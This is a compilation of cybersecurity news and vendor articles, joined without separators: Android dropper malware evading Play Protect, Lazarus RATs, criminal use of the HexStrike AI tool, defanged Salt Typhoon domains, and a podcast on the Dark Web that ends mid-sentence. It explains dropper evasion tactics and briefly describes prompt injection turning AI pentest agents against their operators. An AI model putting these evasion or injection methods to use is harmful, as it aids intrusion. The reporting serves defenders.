Automated routing & ticketing: Standardize routing by defining rules based on severity, asset ownership, and exploitability. Automation can assign findings, generate tickets in tools like Jira or ServiceNow, notify stakeholders through Slack or email, and close out informational issues to ensure findings are automatically routed to the right teams and systems.Standardized remediation workflows: Every finding from your centralized data should follow the same lifecycle from triage to closure based on the criteria you've set, regardless of source. Whether it's discovered from a scanner or manual testing, the process from triage to fix should be consistent and traceable.
Triggered retesting & validation: When a finding is marked as resolved, automation should trigger the appropriate retesting or validation workflow. This ensures nothing slips through the cracks and keeps communication between security and IT teams coordinated and closed-loop.

PlexTrac supports each of these capabilities through its Workflow Automation Engine, helping teams unify and accelerate delivery, remediation, and closure in one platform.


Avoid Common Pitfalls
Automation is about more than just speed. It's about building standardized, scalable systems. However, if not implemented thoughtfully, it can create new problems. Watch out for:

Overcomplicating early efforts: Trying to automate everything at once can stall momentum. Start small and focus on a few repeatable workflows first. Add complexity over time and expand as you validate success.
Treating automation as a one-time setup: Your workflows should evolve alongside your tools, team structure, and priorities. Failing to iterate leads to stale processes that no longer align with how teams operate.
Automating without clearly defined workflows: Jumping into automation without first mapping out your current workflows often leads to chaos. Without clear rules for routing, ownership, and escalation, automation may create more problems than it solves.

How to get started
Here's how to begin automating pentest delivery:

Map your current workflow: Document how findings are delivered, triaged, assigned, and tracked today.
Identify friction points: Look for repetitive tasks, handoff delays, and areas where communication breaks down.
Start small: Automate one or two high-impact steps first, like ticket creation, email alerts, or finding delivery. Add complexity over time as you validate what's working well and use early results to evolve workflows, add rules, and further streamline.
Choose the right platform: Look for solutions that integrate with your existing tools and provide visibility across the vulnerability lifecycle.
Measure impact: Track metrics like MTTR, handoff delays, and retest completion to show the value of your efforts.

The Future of Pentest Delivery
Security teams are shifting from reactive testing to proactive exposure management. Pentest delivery automation is a key part of that evolution to help teams move faster, collaborate better, and reduce risk more effectively.
For Service Providers, this is a chance to differentiate services, scale operations, and deliver more value with less overhead. For Enterprise teams, it means driving maturity, demonstrating progress, and staying ahead of emerging threats.

Conclusion
Pentesting is too important to be stuck in static reports and manual workflows. By automating delivery, routing, and remediation tracking, organizations can unlock the full value of their offensive security efforts by making findings more actionable, standardizing remediation workflows, and delivering measurable outcomes.
Whether you're delivering tests to clients or to an internal team, the message is clear: The future of pentest delivery is automated.
Want to see what automated pentest workflows look like in action? Platforms like PlexTrac centralize security data from both manual testing and automated tools, enabling real-time delivery and standardized workflows across the entire vulnerability lifecycle.

Cybersecurity researchers are calling attention to a new shift in the Android malware landscape where dropper apps, which are typically used to deliver banking trojans, to also distribute simpler malware such as SMS stealers and basic spyware.
These campaigns are propagated via dropper apps masquerading as government or banking apps in India and other parts of Asia, ThreatFabric said in a report last week.
The Dutch mobile security firm said the change is driven by recent security protections that Google has piloted in select markets like Singapore, Thailand, Brazil, and India to block sideloading of potentially suspicious apps requesting dangerous permissions like SMS messages and accessibility services, a heavily abused setting to carry out malicious actions on Android devices. 
""Google Play Protect's defences, particularly the targeted Pilot Program, are increasingly effective at stopping risky apps before they run,"" the company said. ""Second, actors want to future-proof their operations.""

""By encapsulating even basic payloads inside a dropper, they gain a protective shell that can evade today's checks while staying flexible enough to swap payloads and pivot campaigns tomorrow.""
ThreatFabric said that while Google's strategy ups the ante by blocking a malicious app from being installed even before a user can interact with it, attackers are trying out new ways to get around the safeguards – an indication of the endless game of whack-a-mole when it comes to security.
This includes designing droppers keeping in mind Google's Pilot Program, so that they don't seek high-risk permissions and serve only a harmless ""update"" screen that can fly past scanning in the regions where the initiative has gone live.
But it's only when the user clicks the ""Update"" button does the actual payload get fetched from an external server or unpacked, which then proceeds to seek the necessary permissions to fulfil its objectives.
""Play Protect may display alerts about the risks, as a part of a different scan, but as long as the user accepts them, the app is installed, and the payload is delivered,"" ThreatFabric said. ""This illustrates a critical gap: Play Protect still allows risky apps through if the user clicks Install anyway, and the malware still slips through the Pilot Program.""
One such dropper is RewardDropMiner, which has been found to serve along with spyware payloads a Monero cryptocurrency miner that can be activated remotely. Recent variants of the tool, however, no longer include the miner functionality.

Some of the malicious apps delivered via RewardDropMiner, all targeting users in India, are listed below -

PM YOJANA 2025 (com.fluvdp.hrzmkgi)
°RTO Challan (com.epr.fnroyex)
SBI Online (com.qmwownic.eqmff)
Axis Card (com.tolqppj.yqmrlytfzrxa)

Other dropper variants that avoid triggering Play Protect or the Pilot Program include SecuriDropper, Zombinder, BrokewellDropper, HiddenCatDropper, and TiramisuDropper.
When reached for comment, Google told The Hacker News it has not found any apps using these techniques distributed via the Play Store and that it's constantly adding new protections.
""Regardless of where an app comes from – even if it's installed by a 'dropper' app – Google Play Protect helps to keep users safe by automatically checking it for threats,"" a spokesperson said.
""Protection against these identified malware versions was already in place through Google Play Protect prior to this report. Based on our current detection, no apps containing these versions of this malware have been found on Google Play. We're constantly enhancing our protections to help keep users safe from bad actors.""

The development comes as Bitdefender Labs has warned of a new campaign that's using malicious ads on Facebook to peddle a free premium version of the TradingView app for Android to ultimately deploy an improved version of the Brokewell banking trojan to monitor, control, and steal sensitive information from the victim's device.
No less than 75 malicious ads have been run since July 22, 2025, reaching tens of thousands of users in the European Union alone. The Android attack wave is just one part of a larger malvertising operation that has abused Facebook Ads to also target Windows desktops under the guise of various financial and cryptocurrency apps.

""This campaign shows how cybercriminals are fine-tuning their tactics to keep up with user behavior,"" the Romanian cybersecurity company said. ""By targeting mobile users and disguising malware as trusted trading tools, attackers hope to cash in on the growing reliance on crypto apps and financial platforms.""

The North Korea-linked threat actor known as the Lazarus Group has been attributed to a social engineering campaign that distributes three different pieces of cross-platform malware called PondRAT, ThemeForestRAT, and RemotePE.
The attack, observed by NCC Group's Fox-IT in 2024, targeted an organization in the decentralized finance (DeFi) sector, ultimately leading to the compromise of an employee's system.
""From there, the actor performed discovery from inside the network using different RATs in combination with other tools, for example, to harvest credentials or proxy connections,"" Yun Zheng Hu and Mick Koomen said. ""Afterwards, the actor moved to a stealthier RAT, likely signifying a next stage in the attack.""
The attack chain begins with the threat actor impersonating an existing employee of a trading company on Telegram and using fake websites masquerading as Calendly and Picktime to schedule a meeting with the victim.

Although the exact initial access vector is currently not known, the foothold is leveraged to deploy a loader called PerfhLoader, which then drops PondRAT, a known malware assessed to be a stripped-down variant of POOLRAT (aka SIMPLESEA). The cybersecurity company said there is some evidence to suggest that a then-zero-day exploit in the Chrome browser may have been used in the attack.
Also delivered along with PondRAT are a number of other tools, including a screenshotter, keylogger, Chrome credential and cookie stealer, Mimikatz, FRPC, and proxy programs like MidProxy and Proxy Mini.
""PondRAT is a straightforward RAT that allows an operator to read and write files, start processes, and run shellcode,"" Fox-IT said, adding it dates back to at least 2021. ""The actor used PondRAT in combination with ThemeForestRAT for roughly three months, to afterwards clean up and install the more sophisticated RAT called RemotePE.""

The PondRAT malware is designed to communicate over HTTP(S) with a hard-coded command-and-control (C2) server to receive further instructions, with ThemeForestRAT launched directly in memory either via PondRAT or a dedicated loader.
ThemeForestRAT, like PondRAT, monitors for new Remote Desktop (RDP) sessions and contacts a C2 server over HTTP(S) to retrieve as many as twenty commands to enumerate files/directories, perform file operations, execute commands, test TCP connection, timestomp file based on another file on disk, get process listing, download a files, inject shellcode, spawn processes, and hibernate for a specific amount of time.

Fox-IT said ThemeForestRAT shares similarities with a malware codenamed RomeoGolf that was put to use by the Lazarus Group in the November 2014 destructive wiper attack against Sony Pictures Entertainment (SPE). It was documented by Novetta as part of a collaborative effort known as Operation Blockbuster.
RemotePE, on the other hand, is retrieved from a C2 server by RemotePELoader, which, in turn, is loaded by DPAPILoader. Written in C++, RemotePE is a more advanced RAT that's likely reserved for high-value targets.
""PondRAT is a primitive RAT that provides little flexibility, however, as an initial payload it achieves its purpose,"" Fox-IT said. ""For more complex tasks, the actor uses ThemeForestRAT, which has more functionality and stays under the radar as it is loaded into memory only.""

Threat actors are attempting to leverage a newly released artificial intelligence (AI) offensive security tool called HexStrike AI to exploit recently disclosed security flaws.
HexStrike AI, according to its website, is pitched as an AI‑driven security platform to automate reconnaissance and vulnerability discovery with an aim to accelerate authorized red teaming operations, bug bounty hunting, and capture the flag (CTF) challenges.
Per information shared on its GitHub repository, the open-source platform integrates with over 150 security tools to facilitate network reconnaissance, web application security testing, reverse engineering, and cloud security. It also supports dozens of specialized AI agents that are fine-tuned for vulnerability intelligence, exploit development, attack chain discovery, and error handling.

But according to a report from Check Point, threat actors are trying their hands on the tool to gain an adversarial advantage, attempting to weaponize the tool to exploit recently disclosed security vulnerabilities. 
""This marks a pivotal moment: a tool designed to strengthen defenses has been claimed to be rapidly repurposed into an engine for exploitation, crystallizing earlier concepts into a widely available platform driving real-world attacks,"" the cybersecurity company said.
Discussions on darknet cybercrime forums show that threat actors claim to have successfully exploited the three security flaws that Citrix disclosed last week using HexStrike AI, and, in some cases, even flag seemingly vulnerable NetScaler instances that are then offered to other criminals for sale.
Check Point said the malicious use of such tools has major implications for cybersecurity, not only shrinking the window between public disclosure and mass exploitation, but also helping parallelize the automation of exploitation efforts.

What's more, it cuts down the human effort and allows for automatically retrying failed exploitation attempts until they become successful, which the cybersecurity company said increases the ""overall exploitation yield.""
""The immediate priority is clear: patch and harden affected systems,"" it added. ""Hexstrike AI represents a broader paradigm shift, where AI orchestration will increasingly be used to weaponize vulnerabilities quickly and at scale.""

HexStrike AI isn't the first red-teaming and defender-focused tool to be missed by cybercriminals, and it certainly won't be the last. Just last week, Sophos revealed how threat actors weaponized an open-source endpoint monitoring and digital forensic tool called Velociraptor in an attack designed to drop additional payloads.
The disclosure comes as two researchers from Alias Robotics and Oracle Corporation said in a newly published study that AI-powered cybersecurity agents like PentestGPT carry heightened prompt injection risks, effectively turning security tools into cyber weapons via hidden instructions.
""The hunter becomes the hunted, the security tool becomes an attack vector, and what started as a penetration test ends with the attacker gaining shell access to the tester's infrastructure,"" researchers Víctor Mayoral-Vilches and Per Mannermaa Rynning said.
""Current LLM-based security agents are fundamentally unsafe for deployment in adversarial environments without comprehensive defensive measures.""

Sept 08, 2025






You're jolted awake by a 2:46 AM critical alert: ransomware in production. Customer data's compromised, systems are locked, and $1 million Bitcoin demand stares back at you.
Your SIEM lit up. EDR flagged unusual file access. ITDR surfaced account anomalies. But it's too late. The attacker got in with stolen credentials, likely from a phishing email. Once authenticated, they slipped past your defenses, escalated privileges, and detonated ransomware.
The post-incident report reveals what your tools missed: the initial login.
If authentication had tapped real-time signals from your existing security stack — device compliance, threat intelligence, or login anomalies — the stolen credential could have been blocked at the login prompt, stopping the attack cold.
Why Identity Is the New Perimeter
Adversaries are increasingly focused on identities and credentials rather than fortified perimeters or servers. After all, why bother cracking a vault when you can stroll in with the keys? 
That's why we're seeing:

Phishing and credential stuffing campaigns surge
Infostealer malware harvesting secrets en masse
Attackers blend in as valid users; they move laterally, escalate privileges and deploy malware undetected

Why Legacy Solutions Leave Authentication Exposed
EDRs and MDMs do their jobs, but only after someone's inside. Legacy authentication doesn't see what they see. 

EDR detects malware, not malicious logins
MDM enforces device policies, but rarely blocks risky access in real time, especially on unmanaged devices
ITDR flags abuse, but after the attacker's in

This gap means a non-compliant device can be using a valid, stolen credential, rendering these tools as reactive rather than proactive in the security process. The result is fragmented defenses with strong parts that fail to work together at the moment it matters most — login. 
Modern approaches bridge this gap by turning authentication into a context-aware decision point. Instead of just validating credentials, your identity solution should pull data from your security stack to block risky logins up front.
Make Every Login a Security Decision
Identity and security are no longer separate domains, they're converging. Modern identity platforms don't replace existing tools, they make them smarter. By pulling signals from tools you already use, like CrowdStrike, Jamf, or Intune, authentication becomes a live, risk-based decision.
For example, access can be blocked or sessions terminated based on:

Device posture (jailbreaking, disk encryption, Zero Trust score)
Threat intel (known CVEs, unpatched apps)
Compliance readiness (PCI DSS, NIST 800-171)

 This turns access into a live decision based on risk, not just a 'yes' or 'no' based on valid credentials.
Prevent, Don't Just Detect
Integrating these signals lets you:

Block attackers at the door, not chase them after they're inside
Reduce SOC workloads with automated, policy-driven enforcement
Improve ROI on existing security tools without ripping or replacing your stack
Eliminate audit headaches with real-time device state logged per authentication
Reduce friction for end users, given checks occur in the background and go unnoticed

Your identity platform should act as the new security perimeter, not a silent witness to unauthorized access.

The two groups have overlaps in infrastructure, Silent Push revealed in a report published Monday, and appear to be using the domains in cyber-espionage efforts at the behest of the People's Republic of China (PRC).""Our team has identified key domain registration patterns in the publicly reported command and control (C2) infrastructure, which enabled us to discover additional domains that we assess, with high confidence, were set up for either Salt Typhoon or another closely related China-backed threat actor,"" reads to the report. ""We found a total of 45 domain names, the majority of which have not been previously linked to APT activity.""Salt Typhoon — linked to the PRC's Ministry of State Security (MSS) and also known by the names GhostEmperor, FamousSparrow, UNC2286, and others — rose to notoriety last year when it targeted various telecommunications providers in a widespread, high-profile threat campaign. UNC4841, meanwhile, is known for exploiting a vulnerability in Barracuda email security appliances in 2023 to gain access to networks.Related:Secretive MaaS Group 'TAG-150' Develops Novel 'CastleRAT'While the domains identified by Silent Push — all of which are listed in the post — likely are no longer being used by the threat actors, the researchers still believe that ""all domains associated with Salt Typhoon and UNC4841 present a significant level of risk,"" according to the post.""Proactive measures are essential to defend against this evolving threat,"" according to Silent Push, which encouraged other researchers to compare their telemetry and logs against the 45 domains to improve the collective understanding of the threat groups.Tracking Down Malicious DomainsThe researchers' jumping off point for identifying the domains was a blog post published last November by Trend Micro, which tracks Salt Typhoon as Earth Estries, that included C2 hostnames for three pieces of malware used by the group: the Demodex rootkit, as well as the Snappybee and Ghostspider backdoors.By using the WHOIS data source, Silent Push noticed ""some interesting patterns,"" in that many of the domains associated with the malware had been regsitered using a a ProtonMail[.]com email address. Further digging led them down the rabbit hole of at least 45 domains eventually tied to Salt Typhoon and UNC4841, the researchers said.Related:Scammers Are Using Grok to Spread Malicious Links on XThe oldest domain identified as being part of China-backed APT campaigns is onlineeylity[.]com, registered on May 19, 2020, by ""Monica Burch,"" who purports to live at the fake address of 1294 Koontz Lane in Los Angeles.Another fake persona claiming to live in Miami, Shawn Francis, registered a separate group of nine other domains — asparticrooftop[.]com, cloudprocenter[.]com, e-forwardviewupdata[.]com, fitbookcatwer[.]com, hateupopred[.]com, shalaordereport[.]com, verfiedoccurr[.]com, waystrkeprosh[.]com, and xdmgwctese[.]com. Two others, incisivelyfut[.]com and sinceretehope[.]com, also were registered by a person who doesn't exist; in this case, Tommie Arnold, who claims to live at yet another fake address, 1729 Marigold Lane in Miami.""Even so, sharing unique, fake address details gives us a reasonable degree of certainty that the domains themselves are all related infrastructure set up by the same actor,"" Silent Push said in the report. ""The use of a seemingly innocuous English name combined with a nonexistent address in the US"" also is a pattern that the researchers tracked to the China-backed actors, according to Silent Push.Related:Why Threat Hunting Should Be Part of Every Security ProgramAs mentioned, Salt Typhoon and UNC4841 appear to have ceased all activity tied to the domains, according to Silent Push. However, there is one, chekoodver[.]com, that hints at new activity by UNC4841, the researchers said.""This domain was registered on April 30, 2025, through the persona 'Geralyn Pickens' and with the email address ethdbnsnmskndjad55@protonmail[.]com, which is linked to UNC4841,"" according to the post. ""It is the first new addition to the list since October 2023 and may suggest renewed activity.""Chinese Espionage Efforts PersistSalt Typhoon is emerging as one of the most formidable China-backed adversaries in history. Last year's discovery of massive breaches of telecommunications companies across the globe — alongside various other attacks by the group — rocked the global security world well into 2025. Indeed, repercussions from that breach are still being felt as government officials, including those in the US, continue to ponder how to respond to the group's persistent cyber-espionage activities.In light of this, defenders should take any of Salt Typhoon's moves as well as its alignment with other powerful PRC threat actors, very seriously, and comb their networks for any activity related to the newly revealed domains, according to Silent Push. The company stressed that Salt Typhoon actors had access to some telecom networks for a year before they were detected.""As such, we strongly urge any organization that believes itself to be at risk of Chinese espionage to search its DNS logs for the past five years for requests to any of the domains in our archive feed, or their subdomains,"" reads the report. ""It would also be prudent to check for requests to any of the listed IP addresses, particularly during the time periods in which this actor operated them.""About the AuthorElizabeth Montalbano, Contributing WriterElizabeth Montalbano is a freelance writer, journalist, and therapeutic writing mentor with more than 25 years of professional experience.

Keith Jarvis, senior security researcher at Sophos' Counter Threat Unit joins Dark Reading's Alex Culafi for a conversation you don't want to miss.Dark Reading Staff, Dark ReadingAugust 28, 2025Becky BrackenHello, everyone, and welcome to Dark Reading Confidential. It's a podcast from the editors of Dark Reading, bringing you real stories straight from the cyber trenches. I'm your host and Dark Reading editor, Becky Bracken. For this episode, I'm joined by Dark Reading senior reporter Alex Culafi, and Keith Jarvis, who's senior security researcher at Sophos' Counter Threat Unit. They will be giving us a guided tour of today's Dark Web. Welcome, Alex and Keith.Alexander CulafiThank you.Keith JarvisThank you.Becky BrackenWe're really excited. Go ahead, Alex, take it away. Give us our tour.Alexander CulafiAll right. Thanks, Becky. And thanks to Keith for joining us today. We are going to be doing a guided tour through the Dark Web, which is a boogeyman of a term that refers to the sites and content that require special Web browsers to access. They reside on overlay networks.You probably know these sites as where folks buy illegal substances or get scammed. But in cybersecurity, it is where a lot of these ransomware data leak sites are. It is where folks buy a lot of malware kits. There are hacking forums like RAMP — folks sell stolen data and credentials, and so on. It's a complicated thing. And today, I thought it would be great for Keith to join us so we could sort of walk through the cybersecurity piece of it, how researchers and defenders use it, how cybercriminals use it, and how things have changed. Keith, how does your professional life interact with the Dark Web, and how long have you been researching it?Related:Anyone Using Agentic AI Needs to Understand Toxic FlowsKeith JarvisRight, so it's increasingly important. It's something that we've been monitoring in the threat intelligence space for well over a decade now. You know, to the Tor network, the largest anonymity network out there, which is really sort of synonymous with the Dark Web, has been around for decades. But it's only been over the last 10, 15 years that cybercriminals have really fled there from other platforms.So, more and more we're seeing the open communication that's happening between cybercriminals happening on the Tor network and sometimes different networks like ITP, but pretty infrequently. And that's, I think, getting a lot more prevalent now that we're starting to see other forums like Telegram starting to clamp down on open criminality that's been the order of things for the last several decades. We see more cybercriminals moving into what I think is a safer space for them to operate.Alexander CulafiWhen I think about the Dark Web as a term and I think about the idea of things like Dark Web monitoring or whatever on the vendor side, ""Dark Web"" is a very scary term. But when I think about the threat actor side, the last time I looked into it, it was a lot of leak sites. It was a lot of forums. It was a lot of hackers communicating in ways where they assume they'll remain anonymous. Have things mostly stayed the same in the last few years, or have things changed at all?Related:Federal Cuts Put Local, State Agencies at Cyber-RiskKeith JarvisYeah, it's definitely the platform of choice for ransomware groups, overwhelmingly. So 90%-plus of them, when they're leaking data, when they're exposing victims that they've compromised, they'll be doing that on the Tor network. Now, a few of them do maintain what we call clear net sites on the public Internet, on the Web, that any person can access, but it's more and more infrequent that that's happening.And I think it's just an easy way for them to observe a little bit of operational security. They can put a site up quite easily on the Tor network. They can publish data there. And they, for the most part, don't have to worry about the traditional threats of domain takedowns, either through abuse complaints through their provider or, more importantly, through law enforcement action. The last thing they want to do is get identified by law enforcement where they're operating from, even if it's just their website, and have that as a means of sort of attributing them. So if they can do one less thing that puts them out there publicly, they're going to make that choice. And it's not just ransomware groups. It's a lot of other groups you mentioned earlier at the top of the podcast about the drug market. It's been the place where people go to trade in illicit substances, and has been for a very long time. One of the key features of Tor network in many people's minds is the ability to go to these sort of bazaars and find out whatever drug that they're interested in doing, maybe even some drugs they're not interested in doing, but they're there and they're for sale. It's a curiosity for many people, but it's also a way for people to replace their real-life drug dealers and so forth.Related:Chinese Hackers Game Google to Boost Gambling SitesAnd there's other things on there. Like you said, there's malware for sale in certain marketplaces. Cybercriminals, a lot of their forums have at least put up a presence on these Dark Web sites. But frequently, they also run out of clear Web sites. It's a little bit of both. But I think we're seeing more and more traffic moving into these networks.Alexander CulafiWhen a victim gets compromised and their data gets exfiltrated and that data or those credentials go up for sale, I would imagine that even if there are clear Web options, the complexities of how a lot of these hidden services work and a lot of these Dark Net markets work mean that that's probably going to be the first place where a lot of threat actors are going to try to offload whatever they've picked up during a data exfiltration attack.Keith JarvisYeah, that's right. I mean, we know that the credential markets, you know, like one of the largest ones is called Russian Market, and it has a large presence on the Tor network. Genesis in the past was another one. They also maintain, you know, sort of dual connectivity. And I think it's twofold right there. These threat actors are trying to preserve their own operational and personal security, so they don't get attributed and then arrested — the worst-case scenario for them.But they're also trying to give a little bit of comfort to the people who are their clients, right? They want to make sure that they know that, 'We're on the Tor network, you need to access to the Tor network.' So not only is it protecting us, but it's also protecting the people that are coming there and making purchases. You're not coming over the public Internet where you've got all sorts of intelligence agencies and law enforcement agencies doing signals intelligence on everything that goes across the Internet. It's a comfort thing for both buyers and for sellers.Alexander CulafiWhen I think about a lot of these takedowns that have happened in the last few years, whether it's the highly public LockBit one or another one of the ones that we see pop up maybe every three, four, five, six months, it feels like they're happening a lot more frequently than they did maybe five or six years ago when I started covering cybersecurity. Is that more up to law enforcement getting more aggressive? Or is the Dark Web not as anonymous as it used to be and folks are getting around that better? Like how do you explain this increase in law enforcement activity we're seeing?Keith JarvisRight. So there has been an increased tempo from law enforcement to go after these groups for good reason, right? It was just ransomware as an epidemic for IT departments throughout the world. Traditionally, Western Europe and the US really had to worry about it in the mid-2010s. But now you go on these leak sites and it's going to be everywhere from Latin America to Southeast Asia. A lot of people in a lot of places are now really concerned about it. You see a lot of international task force cooperation between these agencies and they really know that they need to make a dent on this because their economies are at risk from just letting this ransomware threat be so pervasive. But I think it's one aspect of a criminal organization, this public website where they're publishing data, but there's so much more to these organizations than just where they're publishing data.While that complicates attribution and tracking to a great degree, it's having those sites out there, they're still having to interact with other cybercriminals and they're doing that through peer-to-peer messaging, they're doing that through forums. When they're receiving ransom payments, those are going through, if not the traditional banking system, then it's going through Bitcoin exchanges and changers and so forth.And that's where I think the most attribution is happening right there, the traditional sort of police work of going after the individuals and maybe they're able to identify where those leak sites are actually located, even if they're on the Tor network. But one of the key things that we've seen with this law enforcement action is that while they really go after the individual, a key outcome there is for them to secure the private keys that let them run those Tor networks. That way they can take over those sites and either post the ""this site has been seized"" type information, which you can't do without accessing the original server or having those private keys available or running those as a honeypot and seeing who comes there looking for the data. If they're running an affiliate program for their ransomware operation, it lets them see who's accessing those panels, and it lets them expose the broader network that's going on behind the scenes. It's definitely working to the benefit of cybercriminals to have this technology available to them.Alexander CulafiBut it does sound like that even though the technological side has maybe improved in some ways in how researchers and law enforcement sort of approach tackling crime on these hidden services, Dark Net sites, whatever, a lot of it is conventional detective, police work. I think back to 10, 15 years ago, when it was the Silk Road and there were these social engineering things where they were posing as members on forums in order to gain sensitive information that law enforcement could later act on.I also know that a lot of researchers will try to make accounts on new hacking forums when they pop up so that they can get in there, see what's going on. I would even count tracing back Bitcoin mixers to try to find out where the source comes from.Do you find that still what a lot of your research and the research of those around you consists of a lot of old school step-by-step detective work?Keith JarvisYeah, absolutely. And if you look at the details of the Silk Road, you know how law enforcement was able to go after that organization. It was from the early days when he was advertising on, you know, clear net forums and saying, Come check out this site. And then eventually he realized that that's not going to work out for me from a personal security perspective. He moved entirely to a lot better security for himself.But in the end, once the spotlight is on you from law enforcement's perspective, they're going to use all of that data going back to your early days to try and attribute that marketplace to a person. And that's what they did there. So, I think what we see today is a lot of criminals, they start small and they're quite content to be on Telegram or some other type of forum. But when they really start to grow, to broaden their operations, that's when they start to think about, Well, maybe I shouldn't do things this way because it puts me at risk.But by then, the Internet doesn't forget, right? All that data is still there. Researchers like myself or law enforcement agencies, we have access to that. If we're not collecting it, we can go search for it and find it. And those early breadcrumbs are often what lead to the big reveals, the big investigative moments where we say, this is connected to that. And it's because they made early mistakes when they rightfully thought that nobody was looking at them, because nobody was looking at them.But it wasn't until a spotlight really got bright when they reached a certain level of notoriety that what they were doing early became important.Alexander CulafiThe last time I looked into what was happening on the Dark Web was I think 2020, 2021. And the thing I had heard at the time was for some types of crimes, let's say the most severe non-cybercrime-related stuff you see on the Dark Web that involves human safety or exploitation, law enforcement would very much work together and for the very, very worst of the criminals, they would work together and get the folks publishing certain materials taken down immediately. On the cybercrime side, on the drug side, what have you, I had heard that maybe there was a slightly more competitive or keep-to-yourself aspect between law enforcement agencies where maybe some of the sharing wouldn't happen.Fast-forward to today, and I think about all of the operations where these international agencies and Europol are working together to take down individual ransomware operators. Do you feel there's been an increase in that public-private, but also public-public, sector collaboration in terms of taking out threat actors?Keith JarvisRight, yeah, there's traditionally been a lot of cooperation when it came to, you know, things like you said, like CSAM, like human trafficking, like counterterrorism. There's been a lot of cooperation between governments that traditionally wouldn't cooperate on just about anything else because they see it as a net benefit to both. But then you get to see the personalities and geopolitical considerations of those governments come out when you're talking about other types of crimes. And cybercrime being one that, you know, it's a dangerous business being an American cybercriminal or a British cybercriminal, but we know that Russia, for example, really gets carte blanche to their cybercriminal underground to carry out attacks against anybody so long as they keep it outside of borders, keep it outside of their political allies.There's not a lot of cooperation there when we talk about going after cybercriminal groups. If an American agency were to go to the Russian Federation and say, we think this conspiracy is running out of a data center in St. Petersburg, they may say, thanks, we'll take a look at it, but that's the end of it. But I think we've seen a lot more diverse jurisdictions throughout the world that say, You know what, cybercrime is just a problem, period. And so you start to see a lot more governments that normally wouldn't cooperate with European or US North American agencies that are starting to do that.And likewise, I think on the public-private partnership, certainly the government's been doing more outreach to try and get engaged with companies like us, with Sophos, and before that, Secureworks, and other leaders in information security to say, We know that you're doing valuable research. We know that you have unique insights into, for example, customer networks. You can see things that are going on in the world that, as a government agency, even though we collect signals, that we just can't see that sort of thing that's happening.We have unique insights, and we're going to try and pass data. We're going to try and declassify it and pass it to you. But likewise, we'd like to hear what's happening from your perspective. And there's been a lot more engagement from both sides. That here in the United States, in England and abroad, more agencies are willing to build those relationships. And I guess the jury's still out on whether or not that's been really effective. But I think it's a trend that nobody will deny that information sharing is the right thing to do. It's not correct to withhold information just because you've collected it. You've got to make sure that the people who are empowered to take action have access to it; otherwise, you're just collecting for the sake of collecting it.Alexander CulafiAnd I know that there's obviously been a lot of change in the last couple years, but thinking about yourself, DHS, whatever, do you still feel like the channels are pretty well open for you to talk to and work with other cyber stakeholders?Keith JarvisYeah, absolutely. You know, we definitely have a lot of flux in the political system here in the US, but other areas are more stable and we have more stable relationships. But nothing's gone oto haywire over here. We still feel like we can reach out to the various agencies in the US government and have action taken and vice versa. I think they're willing to come to us. It remains to be seen what will happen over the ensuing few years.But I think those relationships take work. They take constant engagement to be fruitful. And that's something that both sides really have to focus on. You can't just have a press release that says, Boy, the public-private partnership is so important, and then not do anything to follow up on that, because that's pointless. I think those relationships exist and they're working to a certain degree. But we've got to stay on top of it.Alexander CulafiSure. Going back to the offensive side of targeting threat actors as researchers and law enforcement, as everyone has gotten more aggressive at targeting cybercrime, have you noticed threat actors respond in how they mix their Bitcoins or how they communicate with each other or how they sell data or how they get affiliates or whatever? Have you noticed them respond in how they sort of navigate these Dark Web ecosystems, or is it much of the same old same old?Keith JarvisYeah, so once a threat group has established procedures, they don't like to deviate from that because it takes extra work to figure out another way of doing things. And if something works, why fix something that's not broken? Especially if it's just to evade a perceived threat from a threat intelligence company that's tracking them. But I think where we've seen a lot of that sort of change is with financial sanctions from, like, OFAC and similar organizations where they say, If you're going to pay a ransom, you cannot pay this sanctioned entity. And a lot of those ransomware groups that would establish a brand and then stick with it and you could identify those, you know, those attacks quite easily have been forced, because of those sanctions to change branding, to change their procedures when they're breaching a company to make things look differently, at least for a few weeks to keep up the guise so that while the ransom is being negotiated and possibly paid out, that no one's the wiser that this is a sanctioned group.I think one of the key examples of that is Evil Corp, who have run numerous ransomware operations for the last seven, eight years, where they've had to rebrand multiple times because they're on that sanctioned list. They've really had to out of necessity because of the lawyers, right? They have to make it look like it's somebody else. Because really, I mean, no organization, no matter how up against the wall they are, they can't violate the sanctions, right? The consequences are just too grave for them to ignore it.Alexander CulafiAs everyone's been trying to figure out how to get victims to pay the ransom less often over the years, has the economic sanctions piece been a fairly effective effort at even just slowing it down a little bit?Keith JarvisYeah, in cases where it's been applied, it's been pretty effective. But I think the problem is the tempo of the cybercriminal ecosystem, especially for ransomware, just so far outstrips what the government has been doing. That's the problem, is that gap between how quickly they can deploy sanctions versus what's actually happening on the ground. But when they do it, it's pretty effective. I think everyone would be keen to see that happen more from not just the US government but for other governments where a lot of these ransomware victims reside.Alexander CulafiSure. And then going back to your side of things, the research side, I saw Sophos in June, some of your fellow researchers sort of published research about using AI to identify cybercriminals on the Dark Web. And I wanted to ask you about that if you could speak to it, but also just the other ways that you and other researchers are trying to make the identification and attribution of threat actor operations more effective.Keith JarvisRight, yeah. It's an exciting time for us coming from the Secureworks CTU and merging with Sophos after the acquisition because we've got two different security teams that have been doing very similar work in different ways. And we're now trying to zipper those two things together and figure out what works for them, what works for us. And this is some research that came from the Sophos side. And then the Secureworks CTU side, we've been doing Dark Web research for a number of years. This sort of network analysis approach they've used with AI was really neat technology.One of the problems we've really confronted with our Dark Web collection over the years is how to take that data and normalize it in a way that you can sort of interrogate it, how they've done it with network analysis. We've often relied on our individual researchers, subject matter experts really being familiar with the threat actors, the platforms and knowing who has a high reputation, who doesn't. But what they found with the research with AI is sometimes you can tease out those details just from interrogating the raw data and saying who's connected to who, what terms are folks using, what are they selling and build out those sorts of networks of who's who in the Dark Web or in the forums. And that's really important research, that scalability aspect of it.It's really important to have those subject matter experts that are, day to day, going through that data, as miserable as that may be for them. There's so much data out there, it's a fire hose. When we're not, you know, we have to establish what our priorities are, what are we trying to learn from these networks, these forums, and then we go after that with human interaction. But if you can take that data, raw, and just say, point an LLM at it and say, give me what insights you can draw from this data. And that's just going to get better the more that we're able to tag and normalize this data and really put it into a machine-readable format. So we are really excited for that sort of network investigation, that network aspect of it.Alexander CulafiWould it be fair to say then that if the data you're taking in isn't necessarily changing so much and some of the investigation methods you're using are kind of similar to what they've always been, what this LLM stuff and what some of this more modern technology is able to do is to take a lot of this data, make it meaningful quickly, take a lot of the more busy, repetitive work out of it, and then help you sort of make decisions on it a little sooner than you might've been able to otherwise?Keith JarvisYeah, absolutely. I think that's how most people today are really getting value out of these AI platforms is exactly what you said. Tell me the insights and I'll tell you as an expert on the 